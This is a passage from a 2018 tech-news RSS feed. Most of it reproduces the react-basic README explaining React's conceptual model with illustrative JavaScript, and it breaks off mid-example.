&lt;p&gt;&lt;em&gt;For more on Facebook’s recent troubles, read our feature pieces:&lt;/em&gt;&lt;/p&gt;




</description>
<pubDate>Fri, 06 Apr 2018 04:11:25 +0000</pubDate>
<dc:creator>smacktoward</dc:creator>
<og:title>Facebook retracted Zuckerberg’s messages from recipients’ inboxes</og:title>
<og:description>You can’t remove Facebook messages from the inboxes of people you sent them to, but Facebook did that for Mark Zuckerberg and other executives. Three sources confirm to TechCrunch that old Facebook messages they received from Zuckerberg have disappeared from their Facebook inboxes, while thei…</og:description>
<og:image>https://techcrunch.com/wp-content/uploads/2018/04/gettyimages-669889320-trash-bin.jpg?w=750</og:image>
<og:url>http://social.techcrunch.com/2018/04/05/zuckerberg-deleted-messages/</og:url>
<og:type>article</og:type>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://techcrunch.com/2018/04/05/zuckerberg-deleted-messages/</dc:identifier>
</item>
<item>
<title>Destroy All Software screencasts free this week</title>
<link>https://www.destroyallsoftware.com/screencasts</link>
<guid isPermaLink="true" >https://www.destroyallsoftware.com/screencasts</guid>
<description>&lt;p&gt;I'm Gary Bernhardt. You know me from &lt;a href=&quot;https://www.destroyallsoftware.com/talks/wat&quot;&gt;Wat&lt;/a&gt; and, with luck, from &lt;a href=&quot;https://www.destroyallsoftware.com/talks/boundaries&quot;&gt;Boundaries&lt;/a&gt; or &lt;a href=&quot;https://www.destroyallsoftware.com/talks/the-birth-and-death-of-javascript&quot;&gt;The Birth &amp;amp; Death of JavaScript&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;These screencasts are the ones that I wish I'd had for myself: dense, brief, concrete demonstrations of topics that we usually only talk about in the abstract.&lt;/p&gt;
</description>
<pubDate>Fri, 06 Apr 2018 03:19:44 +0000</pubDate>
<dc:creator>pvsukale3</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.destroyallsoftware.com/screencasts</dc:identifier>
</item>
<item>
<title>React-basic: Description of the conceptual model of React</title>
<link>https://github.com/reactjs/react-basic</link>
<guid isPermaLink="true" >https://github.com/reactjs/react-basic</guid>
<description>&lt;h3&gt;README.md&lt;/h3&gt;
&lt;article class=&quot;markdown-body entry-content&quot; itemprop=&quot;text&quot;&gt;
&lt;p&gt;This document is my attempt to formally explain my mental model of React. The intention is to describe this in terms of deductive reasoning that lead us to this design.&lt;/p&gt;
&lt;p&gt;There may certainly be some premises that are debatable and the actual design of this example may have bugs and gaps. This is just the beginning of formalizing it. Feel free to send a pull request if you have a better idea of how to formalize it. The progression from simple -&amp;gt; complex should make sense along the way without too many library details shining through.&lt;/p&gt;
&lt;p&gt;The actual implementation of React.js is full of pragmatic solutions, incremental steps, algorithmic optimizations, legacy code, debug tooling and things you need to make it actually useful. Those things are more fleeting, can change over time if it is valuable enough and have high enough priority. The actual implementation is much more difficult to reason about.&lt;/p&gt;
&lt;p&gt;I like to have a simpler mental model that I can ground myself in.&lt;/p&gt;
&lt;h2&gt;Transformation&lt;/h2&gt;
&lt;p&gt;The core premise for React is that UIs are simply a projection of data into a different form of data. The same input gives the same output. A simple pure function.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;NameBox&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;name&lt;/span&gt;) {
  &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; { fontWeight&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;bold&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;, labelContent&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt; name };
}
&lt;/pre&gt;&lt;/div&gt;
&lt;pre&gt;
&lt;code&gt;'Sebastian Markbåge' -&amp;gt;
{ fontWeight: 'bold', labelContent: 'Sebastian Markbåge' };
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2&gt;Abstraction&lt;/h2&gt;
&lt;p&gt;You can't fit a complex UI in a single function though. It is important that UIs can be abstracted into reusable pieces that don't leak their implementation details. Such as calling one function from another.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;FancyUserBox&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;user&lt;/span&gt;) {
  &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; {
    borderStyle&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;1px solid blue&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;,
    childContent&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt; [
      &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;Name: &lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;,
      &lt;span class=&quot;pl-en&quot;&gt;NameBox&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;user&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;firstName&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;pl-smi&quot;&gt;user&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;lastName&lt;/span&gt;)
    ]
  };
}
&lt;/pre&gt;&lt;/div&gt;
&lt;pre&gt;
&lt;code&gt;{ firstName: 'Sebastian', lastName: 'Markbåge' } -&amp;gt;
{
  borderStyle: '1px solid blue',
  childContent: [
    'Name: ',
    { fontWeight: 'bold', labelContent: 'Sebastian Markbåge' }
  ]
};
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2&gt;Composition&lt;/h2&gt;
&lt;p&gt;To achieve truly reusable features, it is not enough to simply reuse leaves and build new containers for them. You also need to be able to build abstractions from the containers that &lt;em&gt;compose&lt;/em&gt; other abstractions. The way I think about &quot;composition&quot; is that they're combining two or more different abstractions into a new one.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;FancyBox&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;children&lt;/span&gt;) {
  &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; {
    borderStyle&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;1px solid blue&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;,
    children&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt; children
  };
}

&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;UserBox&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;user&lt;/span&gt;) {
  &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;FancyBox&lt;/span&gt;([
    &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;Name: &lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;,
    &lt;span class=&quot;pl-en&quot;&gt;NameBox&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;user&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;firstName&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;pl-smi&quot;&gt;user&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;lastName&lt;/span&gt;)
  ]);
}
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;State&lt;/h2&gt;
&lt;p&gt;A UI is NOT simply a replication of server / business logic state. There is actually a lot of state that is specific to an exact projection and not others. For example, if you start typing in a text field. That may or may not be replicated to other tabs or to your mobile device. Scroll position is a typical example that you almost never want to replicate across multiple projections.&lt;/p&gt;
&lt;p&gt;We tend to prefer our data model to be immutable. We thread functions through that can update state as a single atom at the top.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;FancyNameBox&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;user&lt;/span&gt;, &lt;span class=&quot;pl-smi&quot;&gt;likes&lt;/span&gt;, &lt;span class=&quot;pl-smi&quot;&gt;onClick&lt;/span&gt;) {
  &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;FancyBox&lt;/span&gt;([
    &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;Name: &lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;, &lt;span class=&quot;pl-en&quot;&gt;NameBox&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;user&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;firstName&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;pl-smi&quot;&gt;user&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;lastName&lt;/span&gt;),
    &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;Likes: &lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;, &lt;span class=&quot;pl-en&quot;&gt;LikeBox&lt;/span&gt;(likes),
    &lt;span class=&quot;pl-en&quot;&gt;LikeButton&lt;/span&gt;(onClick)
  ]);
}

&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; Implementation Details&lt;/span&gt;

&lt;span class=&quot;pl-k&quot;&gt;var&lt;/span&gt; likes &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;;
&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;addOneMoreLike&lt;/span&gt;() {
  likes&lt;span class=&quot;pl-k&quot;&gt;++&lt;/span&gt;;
  &lt;span class=&quot;pl-en&quot;&gt;rerender&lt;/span&gt;();
}

&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; Init&lt;/span&gt;

&lt;span class=&quot;pl-en&quot;&gt;FancyNameBox&lt;/span&gt;(
  { firstName&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;Sebastian&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;, lastName&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;Markbåge&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt; },
  likes,
  addOneMoreLike
);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;em&gt;NOTE: These examples use side-effects to update state. My actual mental model of this is that they return the next version of state during an &quot;update&quot; pass. It was simpler to explain without that but we'll want to change these examples in the future.&lt;/em&gt;&lt;/p&gt;
&lt;h2&gt;Memoization&lt;/h2&gt;
&lt;p&gt;Calling the same function over and over again is wasteful if we know that the function is pure. We can create a memoized version of a function that keeps track of the last argument and last result. That way we don't have to reexecute it if we keep using the same value.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;memoize&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;fn&lt;/span&gt;) {
  &lt;span class=&quot;pl-k&quot;&gt;var&lt;/span&gt; cachedArg;
  &lt;span class=&quot;pl-k&quot;&gt;var&lt;/span&gt; cachedResult;
  &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;arg&lt;/span&gt;) {
    &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (cachedArg &lt;span class=&quot;pl-k&quot;&gt;===&lt;/span&gt; arg) {
      &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; cachedResult;
    }
    cachedArg &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; arg;
    cachedResult &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;fn&lt;/span&gt;(arg);
    &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; cachedResult;
  };
}

&lt;span class=&quot;pl-k&quot;&gt;var&lt;/span&gt; MemoizedNameBox &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;memoize&lt;/span&gt;(NameBox);

&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;NameAndAgeBox&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;user&lt;/span&gt;, &lt;span class=&quot;pl-smi&quot;&gt;currentTime&lt;/span&gt;) {
  &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;FancyBox&lt;/span&gt;([
    &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;Name: &lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;,
    &lt;span class=&quot;pl-en&quot;&gt;MemoizedNameBox&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;user&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;firstName&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;pl-smi&quot;&gt;user&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;lastName&lt;/span&gt;),
    &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;Age in milliseconds: &lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;,
    currentTime &lt;span class=&quot;pl-k&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;pl-smi&quot;&gt;user&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;dateOfBirth&lt;/span&gt;
  ]);
}
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Lists&lt;/h2&gt;
&lt;p&gt;Most UIs are some form of lists that then produce multiple different values for each item in the list. This creates a natural hierarchy.&lt;/p&gt;
&lt;p&gt;To manage the state for each item in a list we can create a Map that holds the state for a particular item.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;UserList&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;users&lt;/span&gt;, &lt;span class=&quot;pl-smi&quot;&gt;likesPerUser&lt;/span&gt;, &lt;span class=&quot;pl-smi&quot;&gt;updateUserLikes&lt;/span&gt;) {
  &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;pl-smi&quot;&gt;users&lt;/span&gt;.&lt;span class=&quot;pl-en&quot;&gt;map&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;FancyNameBox&lt;/span&gt;(
    user,
    &lt;span class=&quot;pl-smi&quot;&gt;likesPerUser&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;get&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;user&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;id&lt;/span&gt;),
    () &lt;span class=&quot;pl-k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;updateUserLikes&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;user&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;id&lt;/span&gt;, &lt;span class=&quot;pl-smi&quot;&gt;likesPerUser&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;get&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;user&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;id&lt;/span&gt;) &lt;span class=&quot;pl-k&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;1&lt;/span&gt;)
  ));
}

&lt;span class=&quot;pl-k&quot;&gt;var&lt;/span&gt; likesPerUser &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;Map&lt;/span&gt;();
&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;updateUserLikes&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;id&lt;/span&gt;, &lt;span class=&quot;pl-smi&quot;&gt;likeCount&lt;/span&gt;) {
  &lt;span class=&quot;pl-smi&quot;&gt;likesPerUser&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;set&lt;/span&gt;(id, likeCount);
  &lt;span class=&quot;pl-en&quot;&gt;rerender&lt;/span&gt;();
}

&lt;span class=&quot;pl-en&quot;&gt;UserList&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;users&lt;/span&gt;, likesPerUser, updateUserLikes);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;em&gt;NOTE: We now have multiple different arguments passed to FancyNameBox. That breaks our memoization because we can only remember one value at a time. More on that below.&lt;/em&gt;&lt;/p&gt;
&lt;h2&gt;Continuations&lt;/h2&gt;
&lt;p&gt;Unfortunately, since there are so many lists of lists all over the place in UIs, it becomes quite a lot of boilerplate to manage that explicitly.&lt;/p&gt;
&lt;p&gt;We can move some of this boilerplate out of our critical business logic by deferring execution of a function. For example, by using &quot;currying&quot; (&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/bind&quot; rel=&quot;nofollow&quot;&gt;&lt;code&gt;bind&lt;/code&gt;&lt;/a&gt; in JavaScript). Then we pass the state through from outside our core functions that are now free of boilerplate.&lt;/p&gt;
&lt;p&gt;This isn't reducing boilerplate but is at least moving it out of the critical business logic.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;FancyUserList&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;users&lt;/span&gt;) {
  &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;FancyBox&lt;/span&gt;(
    &lt;span class=&quot;pl-smi&quot;&gt;UserList&lt;/span&gt;.&lt;span class=&quot;pl-en&quot;&gt;bind&lt;/span&gt;(&lt;span class=&quot;pl-c1&quot;&gt;null&lt;/span&gt;, users)
  );
}

&lt;span class=&quot;pl-k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;box&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;FancyUserList&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;users&lt;/span&gt;);
&lt;span class=&quot;pl-k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;resolvedChildren&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-smi&quot;&gt;box&lt;/span&gt;.&lt;span class=&quot;pl-en&quot;&gt;children&lt;/span&gt;(likesPerUser, updateUserLikes);
&lt;span class=&quot;pl-k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;resolvedBox&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; {
  &lt;span class=&quot;pl-k&quot;&gt;...&lt;/span&gt;box,
  children&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt; resolvedChildren
};
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;State Map&lt;/h2&gt;
&lt;p&gt;We know from earlier that once we see repeated patterns we can use composition to avoid reimplementing the same pattern over and over again. We can move the logic of extracting and passing state to a low-level function that we reuse a lot.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;FancyBoxWithState&lt;/span&gt;(
  &lt;span class=&quot;pl-smi&quot;&gt;children&lt;/span&gt;,
  &lt;span class=&quot;pl-smi&quot;&gt;stateMap&lt;/span&gt;,
  &lt;span class=&quot;pl-smi&quot;&gt;updateState&lt;/span&gt;
) {
  &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;FancyBox&lt;/span&gt;(
    &lt;span class=&quot;pl-smi&quot;&gt;children&lt;/span&gt;.&lt;span class=&quot;pl-en&quot;&gt;map&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;child&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;pl-smi&quot;&gt;child&lt;/span&gt;.&lt;span class=&quot;pl-en&quot;&gt;continuation&lt;/span&gt;(
      &lt;span class=&quot;pl-smi&quot;&gt;stateMap&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;get&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;child&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;key&lt;/span&gt;),
      updateState
    ))
  );
}

&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;UserList&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;users&lt;/span&gt;) {
  &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;pl-smi&quot;&gt;users&lt;/span&gt;.&lt;span class=&quot;pl-en&quot;&gt;map&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&amp;gt;&lt;/span&gt; {
    continuation&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pl-smi&quot;&gt;FancyNameBox&lt;/span&gt;.&lt;span class=&quot;pl-en&quot;&gt;bind&lt;/span&gt;(&lt;span class=&quot;pl-c1&quot;&gt;null&lt;/span&gt;, user),
    key&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pl-smi&quot;&gt;user&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;id&lt;/span&gt;
  });
}

&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;FancyUserList&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;users&lt;/span&gt;) {
  &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;pl-smi&quot;&gt;FancyBoxWithState&lt;/span&gt;.&lt;span class=&quot;pl-en&quot;&gt;bind&lt;/span&gt;(&lt;span class=&quot;pl-c1&quot;&gt;null&lt;/span&gt;,
    &lt;span class=&quot;pl-en&quot;&gt;UserList&lt;/span&gt;(users)
  );
}

&lt;span class=&quot;pl-k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;continuation&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;FancyUserList&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;data&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;users&lt;/span&gt;);
&lt;span class=&quot;pl-en&quot;&gt;continuation&lt;/span&gt;(likesPerUser, updateUserLikes);
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Memoization Map&lt;/h2&gt;
&lt;p&gt;Once we want to memoize multiple items in a list memoization becomes much harder. You have to figure out some complex caching algorithm that balances memory usage with frequency.&lt;/p&gt;
&lt;p&gt;Luckily, UIs tend to be fairly stable in the same position. The same position in the tree gets the same value every time. This tree turns out to be a really useful strategy for memoization.&lt;/p&gt;
&lt;p&gt;We can use the same trick we used for state and pass a memoization cache through the composable function.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;memoize&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;fn&lt;/span&gt;) {
  &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;pl-smi&quot;&gt;arg&lt;/span&gt;, &lt;span class=&quot;pl-smi&quot;&gt;memoizationCache&lt;/span&gt;) {
    &lt;span class=&quot;pl-k&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;pl-smi&quot;&gt;memoizationCache&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;arg&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;===&lt;/span&gt; arg) {
      &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;pl-smi&quot;&gt;memoizationCache&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;result&lt;/span&gt;;
    }
    &lt;span class=&quot;pl-k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;fn&lt;/span&gt;(arg);
    &lt;span class=&quot;pl-smi&quot;&gt;memoizationCache&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;arg&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; arg;
    &lt;span class=&quot;pl-smi&quot;&gt;memoizationCache&lt;/span&gt;.&lt;span class=&quot;pl-smi&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt; result;
    &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; result;
  };
}

&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;FancyBoxWithState&lt;/span&gt;(
  &lt;span class=&quot;pl-smi&quot;&gt;children&lt;/span&gt;,
  &lt;span class=&quot;pl-smi&quot;&gt;stateMap&lt;/span&gt;,
  &lt;span class=&quot;pl-smi&quot;&gt;updateState&lt;/span&gt;,
  &lt;span class=&quot;pl-smi&quot;&gt;memoizationCache&lt;/span&gt;
) {
  &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;FancyBox&lt;/span&gt;(
